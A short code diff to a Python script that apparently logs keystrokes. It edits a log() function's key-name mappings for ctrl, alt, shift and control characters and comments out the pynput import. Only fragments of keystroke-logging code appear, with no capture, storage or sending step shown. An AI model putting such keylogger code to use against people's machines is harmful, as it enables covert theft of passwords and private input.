@@ -1,4 +1,5 @@
-import pynput
+# import pynput
+# import pywin32
 import base64
 import random
 import string
@@ -28,7 +29,8 @@ def log():
         "Key.ctrl_r": " {rctrl} ",
         "Key.alt_l": " {lalt}",
         "Key.alt_r": " {ralt}",
-        "Key.shift": " {sft} ",
+        "Key.shift": "  ", #{sft}
+        # note: keys are logged as capital letters when shift is used but not caps lock shift being logged causes spam
         "Key.cmd": " {cmd} ",
         # control characters
         "\\x01": " {^a} ",
